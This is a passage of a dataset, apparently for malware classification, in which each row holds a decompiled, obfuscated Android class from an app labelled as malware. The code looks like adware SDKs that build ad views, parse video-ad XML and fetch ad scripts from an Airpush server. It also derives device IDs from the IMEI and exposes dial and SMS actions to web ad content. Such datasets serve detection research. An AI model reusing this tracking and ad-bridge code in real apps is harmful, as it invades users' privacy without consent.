   this.b.setTextColor(this.d.d());     B.a(this.b,(Drawable)null);     this.b.setPadding(0,0,0,0);     RelativeLayout relativeLayout=new RelativeLayout(this.c);     relativeLayout.setLayoutParams(new RelativeLayout.LayoutParams(-1,-2));     relativeLayout.addView(this.t);     relativeLayout.addView(this.b);     B.a(relativeLayout,this.d.t());     viewGroup.addView(relativeLayout);   }   @Override public final void e(){     if (!TextUtils.isEmpty(this.l)) {       this.b.setHint(this.l);     }   }   @Override public final void a(  View view){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\X.code","final class X extends H {   private int a;   public X(  Context context,  C0091aw c0091aw){     super(context,c0091aw);   }   @Override public final String a(){     return ""groupHeader"";   }   @Override public final void a(  JSONObject jSONObject) throws JSONException {     this.a=this.d.f();     super.a(jSONObject,true);   }   @Override protected final boolean f(){     return false;   }   @Override protected final void c(){     this.h=new RelativeLayout(this.c);     this.h.setEnabled(false);   }   @Override protected final void d(){     ViewGroup viewGroup=(ViewGroup)this.h;     View view=new View(this.c);     view.setLayoutParams(new RelativeLayout.LayoutParams(-1,B.a(this.c,this.a)));     B.a(view,this.d.r());     viewGroup.addView(view);   }   @Override protected final void e(){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\Y.code","public final class Y extends P {   private Intent a;   public Y(  Context context,  C0091aw c0091aw){     super(context,c0091aw);   }   @Override public final String a(){     return ""ironsourceShare"";   }   @Override public final void a(  JSONObject jSONObject) throws JSONException {     this.a=aE.a(jSONObject);     super.a(jSONObject,true);   }   @Override public final void a(  View view){     super.a(view);     if (this.a != null) {       this.e.startActivity(this.a);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\Z.code","final class Z {   private boolean a;   private String b;   private boolean c;   private boolean d;   private JSONArray e;   private C0091aw f;   public Z(  Context context,  JSONObject jSONObject) throws JSONException {     this.a=jSONObject.optBoolean(""enabled"",true);     this.b=jSONObject.optString(""position"",""left"");     this.c=jSONObject.optBoolean(""showSliderHandle"",true);     this.d=jSONObject.optBoolean(""ftue"",false);     this.e=jSONObject.getJSONArray(""layout"");     this.f=new C0091aw(context,jSONObject.getJSONObject(""style""));   }   public final boolean a(){     return this.c;   }   public final boolean b(){     return this.d;   }   public final JSONArray c(){     return this.e;   }   public final C0091aw d(){     return this.f;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\a.code","public interface a {   public enum EnumC0031a {  smartwall,   overlay,   video,   appwall,   landing_page,   interstitial} public interface b {     void a();     void a(    String str);     void b();     void c();     void d();     void e();     void f();   }   void a();   void a(  EnumC0031a enumC0031a);   void a(  String str);   void b();   void b(  String str);   void c();   void d(); } public interface a {   void a(); } public static class a {   String[] a={""SU"",""MO"",""TU"",""WE"",""TH"",""FR"",""SA""};   final String b=""frequency"";   final String c=""interval"";   final String d=""expires"";   final String e=""exceptionDates"";   final String f=""daysInWeek"";   final String g=""daysInMonth"";   final String h=""daysInYear"";   final String i=""weeksInMonth"";   final String j=""monthsInYear"";   String k;   short l;   String m;   String[] n;   short[] o;   short[] p;   short[] q;   short[] r;   short[] s;   final JSONObject t;   public a(  String str) throws NullPointerException, JSONException {     this.t=new JSONObject(str);     this.k=this.t.isNull(""frequency"") ? """" : this.t.getString(""frequency"");     this.l=this.t.isNull(""interval"") ? (short)0 : Short.parseShort(this.t.getString(""interval""));     this.m=this.t.isNull(""expires"") ? """" : this.t.getString(""expires"");     JSONArray jSONArray=this.t.isNull(""exceptionDates"") ? null : this.t.getJSONArray(""exceptionDates"");     if (jSONArray != null) {       this.n=new String[jSONArray.length()];       for (int i=0; i < this.n.length; i++) {         this.n[i]=jSONArray.getString(i);       }     }     this.o=a(""daysInWeek"");     this.p=a(""daysInMonth"");     this.q=a(""daysInYear"");     this.r=a(""weeksInMonth"");     this.s=a(""monthsInYear"");   }   final short[] a(  String str) throws NullPointerException, JSONException {     JSONArray jSONArray=this.t.isNull(str) ? null : this.t.getJSONArray(str);     if (jSONArray == null) {       return null;     }     short[] sArr=new short[jSONArray.length()];     for (int i=0; i < sArr.length; i++) {       sArr[i]=(short)jSONArray.getInt(i);     }     return sArr;   }   public String a(  short[] sArr){     String str="""";     for (int i=0; i < sArr.length; i++) {       if (i == 0) {         str="""" + this.a[sArr[i]];       }  else {         str=str + "","" + this.a[sArr[i]];       }     }     return str;   }   public String a(  String[] strArr) throws Exception {     String str="""";     for (int i=0; i < strArr.length; i++) {       if (i == 0) {         Date parse=new SimpleDateFormat(""yyyy-MM-dd"").parse(strArr[i]);         System.out.println(""dt: "" + parse);         str="""" + new SimpleDateFormat(""yyyyMMdd'T'HHmmss'Z'"").format(parse);       }  else {         Date parse2=new SimpleDateFormat(""yyyy-MM-dd"").parse(strArr[i]);         System.out.println(""dt: "" + parse2);         str=str + "","" + new SimpleDateFormat(""yyyyMMdd'T'HHmmss'Z'"").format(parse2);       }     }     return str;   }   public String b(  String str) throws Exception {     Date parse=new SimpleDateFormat(""yyyy-MM-dd"").parse(str);     System.out.println(""dt: "" + parse);     return new SimpleDateFormat(""yyyyMMdd'T'HHmmss'Z'"").format(parse);   }   String a() throws Exception {     return this.n != null ? a(this.n) : """";   }   public String b(){     StringBuilder sb=new StringBuilder();     try {       if (this.k != null && !this.k.equals("""")) {         sb.append(""FREQ="" + this.k + "";"");       }       if (this.l != 0) {         sb.append(""INTERVAL="" + ((int)this.l) + "";"");       }       if (this.m != null && !this.m.equals("""")) {         sb.append(""UNTIL="" + b(this.m) + "";"");       }       if (this.o != null) {         sb.append(""BYDAY="" + a(this.o) + "";"");       }       if (this.p != null) {         sb.append(""BYMONTHDAY="" + this.p + "";"");       }       if (this.q != null) {         sb.append(""BYYEARDAY="" + this.q + "";"");       }       if (this.r != null) {         sb.append(""BYWEEKNO="" + this.r + "";"");       }       if (this.s != null) {         sb.append(""BYMONTH="" + this.s + "";"");       }       o.a(""Rrule: "" + sb.toString());     }  catch (    Exception e) {       e.printStackTrace();     }     return sb.toString();   } } !org.eclipse.jdt.core.dom.TypeDeclaration@654e0e32private static class a extends HttpEntityWrapper {   public a(  HttpEntity httpEntity){     super(httpEntity);   }   @Override public InputStream getContent() throws IOException {     return new GZIPInputStream(this.wrappedEntity.getContent());   }   @Override public long getContentLength(){     return -1L;   } } private class a {   private a(){   }   @JavascriptInterface public void close(){     j.this.dismiss();     if (j.r.equals(j.AD_TYPE_DIALOG_U) || j.r.equals(j.AD_TYPE_DIALOG_CC) || j.r.equals(j.AD_TYPE_DIALOG_CM)) {       j.this.a(""45"");     }  else {       j.this.a(""25"");     }     j.this.a.finish();   }   @JavascriptInterface public void open(  String str){     j.this.b(str);     j.this.a.finish();   }   @JavascriptInterface public void call(  String str){     try {       j.this.dismiss();       Intent intent=new Intent(""android.intent.action.DIAL"",Uri.parse(""tel:"" + str));       intent.addFlags(268435456);       j.this.a.startActivity(intent);       if (j.r.equals(j.AD_TYPE_DIALOG_U) || j.r.equals(j.AD_TYPE_DIALOG_CC) || j.r.equals(j.AD_TYPE_DIALOG_CM)) {         j.this.a(""44"");       }  else {         j.this.a(""24"");       }     }  catch (    ActivityNotFoundException e) {       e.printStackTrace();     } catch (    Exception e2) {     }     j.this.a.finish();   }   @JavascriptInterface public void sms(  String str,  String str2){     try {       j.this.dismiss();       Intent intent=new Intent(""android.intent.action.VIEW"");       intent.addFlags(268435456);       intent.setType(""vnd.android-dir/mms-sms"");       intent.putExtra(""address"",str);       intent.putExtra(""sms_body"",str2);       j.this.a.startActivity(intent);       if (j.r.equals(j.AD_TYPE_DIALOG_U) || j.r.equals(j.AD_TYPE_DIALOG_CC) || j.r.equals(j.AD_TYPE_DIALOG_CM)) {         j.this.a(""44"");       }  else {         j.this.a(""24"");       }     }  catch (    Exception e) {       j.this.a.finish();       e.printStackTrace();     }   } } public class a extends WebViewClient {   boolean a=false;   a(){   }   @Override public void onPageFinished(  WebView webView,  String str){     super.onPageFinished(webView,str);     if (!this.a) {       if (MraidView.this.m == null || (MraidView.this.m != ""expanded"" && MraidView.this.m != ""resized"")) {         MraidView.this.a();       }       if (MraidView.this.d != null) {         MraidView.this.d.b();       }       MraidView.this.l();     }   }   @Override public void onReceivedError(  WebView webView,  int i,  String str,  String str2){     this.a=true;     super.onReceivedError(webView,i,str,str2);     if (MraidView.this.d != null) {       MraidView.this.d.a(str);     }     if (MraidView.this.e != null) {       MraidView.this.e.sendEmptyMessage(-4);     }   } } public class a {   protected static final String PREFS_DEVICE_ID=""device_id"";   protected static final String PREFS_FILE=""device_id.xml"";   protected UUID a;   public a(  Context context){     if (this.a == null) { synchronized (a.class) {         if (this.a == null) {           SharedPreferences sharedPreferences=context.getSharedPreferences(PREFS_FILE,0);           String string=sharedPreferences.getString(PREFS_DEVICE_ID,null);           if (string != null) {             this.a=UUID.fromString(string);           }  else {             String string2=Settings.Secure.getString(context.getContentResolver(),""android_id"");             try {               if (!""9774d56d682e549c"".equals(string2)) {                 this.a=UUID.nameUUIDFromBytes(string2.getBytes(""utf8""));               }  else {                 String deviceId=((TelephonyManager)context.getSystemService(""phone"")).getDeviceId();                 this.a=deviceId != null ? UUID.nameUUIDFromBytes(deviceId.getBytes(""utf8"")) : UUID.randomUUID();               }               sharedPreferences.edit().putString(PREFS_DEVICE_ID,this.a.toString()).commit();             }  catch (            UnsupportedEncodingException e) {               throw new RuntimeException(e);             }           }         }       }     }   }   public UUID a(){     return this.a;   } } public static final class a implements Runnable {   c<Boolean> a;   private Context b;   public a(  Context context,  c<Boolean> cVar){     this.b=context;     this.a=cVar;   }   @Override public void run(){     HttpURLConnection httpURLConnection;     HttpURLConnection httpURLConnection2=null;     try {       try {         if (o.o(this.b)) {           Log.i(""AirplayMraid"",""Getting mraid>>>>"");           httpURLConnection=(HttpURLConnection)new URL(""http://api.airpush.com/mraid/native_mraid.php"").openConnection();           try {             httpURLConnection.setRequestMethod(""GET"");             httpURLConnection.setConnectTimeout(5000);             httpURLConnection.setReadTimeout(10000);             httpURLConnection.setUseCaches(true);             httpURLConnection.setDefaultUseCaches(true);             httpURLConnection.connect();             if (httpURLConnection.getResponseCode() == 200) {               BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));               StringBuffer stringBuffer=new StringBuffer();               while (true) {                 String readLine=bufferedReader.readLine();                 if (readLine == null) {                   break;                 }                 stringBuffer.append(readLine);                 stringBuffer.append('\r');               }               bufferedReader.close();               SharedPreferences.Editor edit=this.b.getSharedPreferences(Initializer.PRODUCT_MRAID,0).edit();               edit.putString(""mr"",stringBuffer.toString());               this.a.a(Boolean.valueOf(edit.commit()));               if (httpURLConnection != null) {                 httpURLConnection.disconnect();                 return;               }               return;             }             Log.i(""AirplayMraid"",""Status Code: "" + httpURLConnection.getResponseCode());             Log.i(""AirplayMraid"",""HTTP Reason: "" + httpURLConnection.getResponseMessage());           }  catch (          Exception e) {             httpURLConnection2=httpURLConnection;             e=e;             e.printStackTrace();             if (httpURLConnection2 != null) {               httpURLConnection2.disconnect();             }             this.a.a(false);           } catch (          Throwable th) {             httpURLConnection2=httpURLConnection;             th=th;             if (httpURLConnection2 != null) {               httpURLConnection2.disconnect();             }             throw th;           }         }  else {           httpURLConnection=null;         }         if (httpURLConnection != null) {           httpURLConnection.disconnect();         }       }  catch (      Exception e2) {         e=e2;       }       this.a.a(false);     }  catch (    Throwable th2) {       th=th2;     }   } } public class a {   private boolean b;   private String c;   private String d;   private String e;   private String f;   private String g;   private List<HashMap<String,Object>> h;   private HashMap<String,String> i;   private String j;   private String k;   private List<HashMap<String,String>> l;   private List<HashMap<String,String>> m;   private List<HashMap<String,Object>> n;   public a(  XmlPullParser xmlPullParser) throws XmlPullParserException, Exception, Throwable {     q.this.a(""Parsing Creative data"");     xmlPullParser.require(2,q.this.a,""Creative"");     this.d=xmlPullParser.getAttributeValue(q.this.a,AnalyticsEvent.EVENT_ID);     this.e=xmlPullParser.getAttributeValue(q.this.a,""sequence"");     this.f=xmlPullParser.getAttributeValue(q.this.a,""AdID"");     while (xmlPullParser.next() != 3) {       if (xmlPullParser.getEventType() == 2) {         String name=xmlPullParser.getName();         q.this.a(""Creative Name: "" + name);         if (xmlPullParser.isEmptyElementTag()) {           q.this.a(""Empty tag in creative: "" + name);           xmlPullParser.nextTag();         }  else         if (xmlPullParser.getName().equals(""Linear"")) {           String attributeValue=xmlPullParser.getAttributeValue(q.this.a,""skipoffset"");           if (attributeValue == null) {             this.b=false;             q.this.a(""AdSkipable: "" + this.b);           }  else {             this.b=true;             this.c=attributeValue;             q.this.a(""AdSkipable: "" + this.b + "", Skip offset: ""+ this.c);           }         }  else         if (name.equals(""Icon"")) {           if (this.h == null) {             this.h=new ArrayList();           }           HashMap<String,Object> hashMap=new HashMap<>();           int a=a(xmlPullParser.getAttributeValue(q.this.a,""width""));           int a2=a(xmlPullParser.getAttributeValue(q.this.a,""height""));           String attributeValue2=xmlPullParser.getAttributeValue(q.this.a,""program"");           String attributeValue3=xmlPullParser.getAttributeValue(q.this.a,""xPosition"");           String attributeValue4=xmlPullParser.getAttributeValue(q.this.a,""yPosition"");           String attributeValue5=xmlPullParser.getAttributeValue(q.this.a,""Duration"");           String attributeValue6=xmlPullParser.getAttributeValue(q.this.a,""apiFramework"");           String attributeValue7=xmlPullParser.getAttributeValue(q.this.a,""offset"");           q.this.a(""ICON: width: "" + a + "", height: ""+ a2+ "", program: ""+ attributeValue2+ "", xPosition: ""+ attributeValue3+ "", duration:""+ attributeValue5+ "", apiFramework:""+ attributeValue6+ "", offset:""+ attributeValue7);           hashMap.put(""width"",Integer.valueOf(a));           hashMap.put(""height"",Integer.valueOf(a2));           hashMap.put(""program"",attributeValue2);           hashMap.put(""xPosition"",attributeValue3);           hashMap.put(""yPosition"",attributeValue4);           hashMap.put(""apiFramework"",attributeValue6);           hashMap.put(""Duration"",attributeValue5);           hashMap.put(""offset"",attributeValue7);           while (xmlPullParser.next() != 3) {             if (xmlPullParser.getEventType() == 2) {               String name2=xmlPullParser.getName();               q.this.a(""Icon Name: "" + name);               if (xmlPullParser.isEmptyElementTag()) {                 q.this.a(""Empty tag in creative: "" + name);                 xmlPullParser.nextTag();               }  else               if (name2.equals(""StaticResource"")) {                 String attributeValue8=xmlPullParser.getAttributeValue(q.this.a,""creativeType"");                 String a3=q.this.a(xmlPullParser);                 hashMap.put(""creativeType"",attributeValue8);                 hashMap.put(""StaticResource"",a3);                 q.this.a(""Creative type:"" + attributeValue8 + "", Static res: ""+ a3);               }  else               if (name2.equals(""IconClickThrough"")) {                 String a4=q.this.a(xmlPullParser);                 hashMap.put(""IconClickThrough"",a4);                 q.this.a(""Icon click through: "" + a4);                 xmlPullParser.nextTag();               }  else               if (name2.equals(""IconClickTracking"")) {                 String a5=q.this.a(xmlPullParser);                 hashMap.put(""IconClickTracking"",a5);                 q.this.a(""IconClickTracking: "" + a5);               }  else               if (name2.equals(""IconViewTracking"")) {                 String a6=q.this.a(xmlPullParser);                 hashMap.put(""IconViewTracking"",a6);                 q.this.a(""IconViewTracking: "" + a6);               }             }           }           this.h.add(hashMap);           xmlPullParser.nextTag();         }  else         if (name.equals(""Duration"")) {           this.g=q.this.a(xmlPullParser);           q.this.a(""Duration: "" + this.g);         }  else         if (name.equals(""TrackingEvents"")) {           q.this.a(""inside tracking event."");           while (xmlPullParser.next() != 3) {             if (xmlPullParser.getEventType() == 2) {               String name3=xmlPullParser.getName();               if (xmlPullParser.isEmptyElementTag()) {                 q.this.a(""Empty tag in tracking: "" + name3);                 xmlPullParser.nextTag();               }  else               if (name3.equals(""Tracking"")) {                 if (this.i == null) {                   this.i=new HashMap<>();                 }                 String attributeValue9=xmlPullParser.getAttributeValue(q.this.a,""event"");                 String a7=q.this.a(xmlPullParser);                 this.i.put(attributeValue9,a7);                 q.this.a(""Tracking event: "" + attributeValue9 + "", url: ""+ a7);               }             }           }         }  else         if (name.equals(""AdParameters"")) {           this.j=q.this.a(xmlPullParser);           q.this.a(""AdParameters: "" + this.j);         }  else         if (name.equals(""VideoClicks"")) {           while (xmlPullParser.next() != 3) {             if (xmlPullParser.getEventType() == 2) {               String name4=xmlPullParser.getName();               if (xmlPullParser.isEmptyElementTag()) {                 q.this.a(""Empty tag in creative: "" + name4);                 xmlPullParser.nextTag();               }  else               if (name4.equals(""ClickThrough"")) {                 this.k=q.this.a(xmlPullParser);                 q.this.a(""Video click through url: "" + this.k);               }  else               if (name4.equals(""ClickTracking"")) {                 HashMap<String,String> hashMap2=new HashMap<>();                 String attributeValue10=xmlPullParser.getAttributeValue(q.this.a,AnalyticsEvent.EVENT_ID);                 String a8=q.this.a(xmlPullParser);                 hashMap2.put(AnalyticsEvent.EVENT_ID,attributeValue10);                 hashMap2.put(""ClickTracking"",a8);                 if (this.l == null) {                   this.l=new ArrayList();                 }                 this.l.add(hashMap2);                 q.this.a(""Video click tracking ID: "" + attributeValue10 + "", url: ""+ a8);               }  else               if (name4.equals(""CustomClick"")) {                 HashMap<String,String> hashMap3=new HashMap<>();                 String attributeValue11=xmlPullParser.getAttributeValue(q.this.a,AnalyticsEvent.EVENT_ID);                 String a9=q.this.a(xmlPullParser);                 hashMap3.put(AnalyticsEvent.EVENT_ID,attributeValue11);                 hashMap3.put(""CustomClick"",a9);                 if (this.m == null) {                   this.m=new ArrayList();                 }                 this.m.add(hashMap3);                 q.this.a(""Video Custom click tracking ID: "" + attributeValue11 + "", url: ""+ a9);               }             }           }         }  else         if (name.equals(""MediaFiles"")) {           while (xmlPullParser.next() != 3) {             if (xmlPullParser.getEventType() == 2) {               String name5=xmlPullParser.getName();               if (xmlPullParser.isEmptyElementTag()) {                 q.this.a(""Empty tag in media: "" + name5);                 xmlPullParser.nextTag();               }  else               if (name5.equals(""MediaFile"")) {                 String attributeValue12=xmlPullParser.getAttributeValue(q.this.a,AnalyticsEvent.EVENT_ID);                 String attributeValue13=xmlPullParser.getAttributeValue(q.this.a,""delivery"");                 String attributeValue14=xmlPullParser.getAttributeValue(q.this.a,AnalyticsSQLiteHelper.EVENT_LIST_TYPE);                 int a10=a(xmlPullParser.getAttributeValue(q.this.a,""bitrate""));                 int a11=a(xmlPullParser.getAttributeValue(q.this.a,""width""));                 int a12=a(xmlPullParser.getAttributeValue(q.this.a,""height""));                 boolean parseBoolean=Boolean.parseBoolean(xmlPullParser.getAttributeValue(q.this.a,""scalable""));                 boolean parseBoolean2=Boolean.parseBoolean(xmlPullParser.getAttributeValue(q.this.a,""maintainAspectRatio""));                 String attributeValue15=xmlPullParser.getAttributeValue(q.this.a,""apiFramework"");                 String attributeValue16=xmlPullParser.getAttributeValue(q.this.a,""codec"");                 int a13=a(xmlPullParser.getAttributeValue(q.this.a,""maxBitrate""));                 int a14=a(xmlPullParser.getAttributeValue(q.this.a,""minBitrate""));                 String a15=q.this.a(xmlPullParser);                 q.this.a(""Media id: "" + attributeValue12 + "", delivery: ""+ attributeValue13+ "", type: ""+ attributeValue14+ "", bitrate: ""+ a10+ "", width: ""+ a11+ "", height: ""+ a12+ "", scalable: ""+ parseBoolean+ "", aspect ratio: ""+ parseBoolean2+ "", apiFrameowrk: ""+ attributeValue15+ "", codec: ""+ attributeValue16+ "", maxBitrate: ""+ a13+ "", minBitrate: ""+ a14+ "", URI: ""+ a15);                 HashMap<String,Object> hashMap4=new HashMap<>();                 hashMap4.put(AnalyticsEvent.EVENT_ID,attributeValue12);                 hashMap4.put(""delivery"",attributeValue13);                 hashMap4.put(AnalyticsSQLiteHelper.EVENT_LIST_TYPE,attributeValue14);                 hashMap4.put(""bitrate"",Integer.valueOf(a10));                 hashMap4.put(""width"",Integer.valueOf(a11));                 hashMap4.put(""height"",Integer.valueOf(a12));                 hashMap4.put(""scalable"",Boolean.valueOf(parseBoolean));                 hashMap4.put(""maintainAspectRatio"",Boolean.valueOf(parseBoolean2));                 hashMap4.put(""apiFramework"",attributeValue15);                 hashMap4.put(""codec"",attributeValue16);                 hashMap4.put(""maxBitrate"",Integer.valueOf(a13));                 hashMap4.put(""minBitrate"",Integer.valueOf(a14));                 hashMap4.put(""MediaFile"",a15);                 if (this.n == null) {                   this.n=new ArrayList();                 }                 this.n.add(hashMap4);               }             }           }         }       }     }   }   public boolean a(){     return this.b;   }   public String b(){     return this.c;   }   public List<HashMap<String,Object>> c(){     return this.h;   }   public HashMap<String,String> d(){     return this.i;   }   public String e(){     return this.j;   }   public String f(){     return this.k;   }   public List<HashMap<String,String>> g(){     return this.l;   }   public List<HashMap<String,String>> h(){     return this.m;   }   public List<HashMap<String,Object>> i(){     return this.n;   }   private int a(  String str){     try {       return Integer.parseInt(str);     }  catch (    NumberFormatException|Exception e) {       return 0;     }   } } private class a extends Dialog implements DialogInterface.OnCancelListener, DialogInterface.OnDismissListener {   public a(  Context context,  String str){     super(context);     requestWindowFeature(1);     getWindow().setBackgroundDrawable(new ColorDrawable(0));     setCancelable(true);     setCanceledOnTouchOutside(false);     setOnCancelListener(this);     setOnDismissListener(this);     int i=(int)(SmartWallActivity.this.getResources().getDisplayMetrics().density * 7.0f);     RelativeLayout relativeLayout=new RelativeLayout(context);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-1,-2);     layoutParams.setMargins(i,i,i,i);     layoutParams.addRule(15,-1);     layoutParams.addRule(14,-1);     relativeLayout.setLayoutParams(layoutParams);     WebView unused=SmartWallActivity.d=new WebView(context);     SmartWallActivity.d.getSettings().setCacheMode(-1);     SmartWallActivity.d.getSettings().setJavaScriptEnabled(true);     SmartWallActivity.d.addJavascriptInterface(new C0029a(),""Appwall"");     SmartWallActivity.d.setWebChromeClient(new WebChromeClient());     SmartWallActivity.d.setWebViewClient(new WebViewClient(){       @Override public void onPageFinished(      WebView webView,      String str2){         super.onPageFinished(webView,str2);         try {           if (SmartWallActivity.this.k != null) {             SmartWallActivity.this.k.dismiss();           }           a.this.show();         }  catch (        Exception e) {           SmartWallActivity.this.finish();         }       }       @Override public void onReceivedError(      WebView webView,      int i2,      String str2,      String str3){         try {           if (SmartWallActivity.this.k != null) {             SmartWallActivity.this.k.dismiss();           }           if (SmartWallActivity.this.h != null) {             SmartWallActivity.this.h.dismiss();           }           String str4=""Error occurred while loading AppWall: code "" + i2 + "", desc: ""+ str2;           Log.e(SmartWallActivity.c,str4);           if (com.lntasllo.pzdcmwai3830.b.a != null) {             com.lntasllo.pzdcmwai3830.b.a.a(str4);           }         }  catch (        Throwable th) {           Log.e(SmartWallActivity.c,""Error occurred while loading AppWall: code "" + i2 + "", desc: ""+ str2);         }         SmartWallActivity.this.finish();       }       @Override public boolean shouldOverrideUrlLoading(      WebView webView,      String str2){         try {           o.a(""SmartWall Url: "" + str2);           try {             SmartWallActivity.this.h.dismiss();           }  catch (          Exception e) {           } catch (          Throwable th) {           }           Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(str2));           intent.addFlags(268435456);           intent.addFlags(8388608);           SmartWallActivity.this.startActivity(intent);           SmartWallActivity.this.finish();           return true;         }  catch (        Exception e2) {           e2.printStackTrace();           return false;         }       }     } );     SmartWallActivity.d.setVerticalScrollBarEnabled(false);     SmartWallActivity.d.setHorizontalScrollBarEnabled(false);     SmartWallActivity.d.setScrollBarStyle(33554432);     SmartWallActivity.d.getSettings().setLayoutAlgorithm(WebSettings.LayoutAlgorithm.NORMAL);     SmartWallActivity.d.setLayoutParams(new RelativeLayout.LayoutParams(-1,-2));     relativeLayout.addView(SmartWallActivity.d);     setContentView(relativeLayout);     SmartWallActivity.d.loadUrl(str);   }   @Override public void onCancel(  DialogInterface dialogInterface){     if (dialogInterface != null) {       try {         dialogInterface.dismiss();       }  catch (      Exception e) {         return;       }     }     SmartWallActivity.this.finish();   }   @Override public void onDismiss(  DialogInterface dialogInterface){     if (dialogInterface != null) {       try {         dialogInterface.dismiss();       }  catch (      Exception e) {       } catch (      Throwable th) {       }     }     if (SmartWallActivity.d != null) {       SmartWallActivity.d.stopLoading();       SmartWallActivity.d.removeAllViews();       SmartWallActivity.d.destroy();     }     SmartWallActivity.this.finish();   } public class C0029a {     public C0029a(){     }     @JavascriptInterface public void closewin(){       SmartWallActivity.this.h.dismiss();       SmartWallActivity.this.finish();     }     @JavascriptInterface public void triggerEvent(    String str){     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\AdView.code","!org.eclipse.jdt.core.dom.TypeDeclaration@45b01c89"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\AnonymousClass1.code","public class AnonymousClass1 implements c<String> {   String a="""";   final String b;   AnonymousClass1(  String str){     this.b=str;   }   @Override public void a(  String str){     o.a(""Video file: "" + str);     if (str != null) {       try {         if (!str.equals("""")) {           if (b.d) {             if (new d(r.this.b).a(a.EnumC0031a.video,str,str)) {               b.a(a.EnumC0031a.video);             }  else             if (b.a != null) {               b.b(""Video ad not cached."");             }           }  else {             Intent intent=new Intent(r.this.b,(Class<?>)VideoAdActivity.class);             intent.setAction(""play_video"");             intent.setFlags(268435456);             intent.addFlags(8388608);             intent.addFlags(536870912);             intent.setData(Uri.parse(str));             r.this.b.startActivity(intent);             m.b(r.this.b);           }         }       }  catch (      Exception e) {         Log.e(r.TAG,""Error occured while download video"",e);         return;       }     }     Log.e(r.TAG,""Not able to download video"");   }   @Override public void a(){     try {       File file=new File(Environment.getExternalStorageDirectory(),""ap_video"");       if (file.exists() && file.isDirectory()) {         p.a(file);         file.mkdirs();         this.a=file.getAbsolutePath();       }  else       if (file.mkdirs()) {         this.a=file.getAbsolutePath();       }       new Thread(new Runnable(){         @Override public void run(){           try {             try {               URLConnection openConnection=new URL(AnonymousClass1.this.b).openConnection();               openConnection.setConnectTimeout(7000);               openConnection.setReadTimeout(7000);               openConnection.connect();               Log.i(r.TAG,""Content-length: "" + openConnection.getContentLength());               InputStream inputStream=openConnection.getInputStream();               File file2=new File(AnonymousClass1.this.a,""ad_video.mp4"");               try {                 if (file2.exists()) {                   file2.delete();                 }               }  catch (              Exception e) {                 e.printStackTrace();               }               FileOutputStream fileOutputStream=new FileOutputStream(file2);               byte[] bArr=new byte[android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT];               while (true) {                 int read=inputStream.read(bArr);                 if (read > 0) {                   fileOutputStream.write(bArr,0,read);                 }  else {                   fileOutputStream.close();                   AnonymousClass1.this.a(file2.getAbsolutePath());                   return;                 }               }             }  catch (            MalformedURLException e2) {               e2.printStackTrace();               AnonymousClass1.this.a((String)null);             }           }  catch (          SocketTimeoutException e3) {             e3.printStackTrace();             AnonymousClass1.this.a((String)null);           } catch (          IOException e4) {             e4.printStackTrace();             AnonymousClass1.this.a((String)null);           }         }       } ,""dwn_video"").start();     }  catch (    Exception e) {       e.printStackTrace();     } catch (    Throwable th) {     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\AnonymousClass2.code","public class AnonymousClass2 implements DialogInterface.OnClickListener {   final String a;   final String b;   AnonymousClass2(  String str,  String str2){     this.a=str;     this.b=str2;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.dismiss();     new Thread(new Runnable(){       @Override public void run(){         try {           HttpURLConnection httpURLConnection=(HttpURLConnection)new URL(AnonymousClass2.this.a).openConnection();           httpURLConnection.setDoInput(true);           httpURLConnection.connect();           Bitmap decodeStream=BitmapFactory.decodeStream(httpURLConnection.getInputStream());           File file=new File(MraidView.this.getContext().getApplicationInfo().dataDir,AnonymousClass2.this.b);           Log.i(""TAG"",""file: "" + file.getAbsolutePath());           FileOutputStream fileOutputStream=new FileOutputStream(file);           decodeStream.compress(Bitmap.CompressFormat.JPEG,85,fileOutputStream);           fileOutputStream.flush();           fileOutputStream.close();         }  catch (        IOException e) {           e.printStackTrace();         }         try {           MediaStore.Images.Media.insertImage(MraidView.this.getContext().getContentResolver(),MraidView.this.getContext().getApplicationInfo().dataDir + ""/"" + AnonymousClass2.this.b,""My Image"",AnonymousClass2.this.b);           MraidView.this.post(new Runnable(){             @Override public void run(){               MraidView.this.g(""93"");               Log.i(""AirplayMraid"",""Ad image is saved in Gallery."");               MraidView.this.a(true);             }           } );         }  catch (        FileNotFoundException e2) {           MraidView.this.post(new Runnable(){             @Override public void run(){               MraidView.this.b(""storePicture"",""Url does not exist."");               MraidView.this.a(true);             }           } );           e2.printStackTrace();         } catch (        Exception e3) {           MraidView.this.post(new Runnable(){             @Override public void run(){               MraidView.this.b(""storePicture"",""Unknown error occured: "" + e3.getMessage());               if (MraidView.this.d != null) {                 MraidView.this.d.c();               }               MraidView.this.a(true);             }           } );           e3.printStackTrace();         }       }     } ).start();   } } "
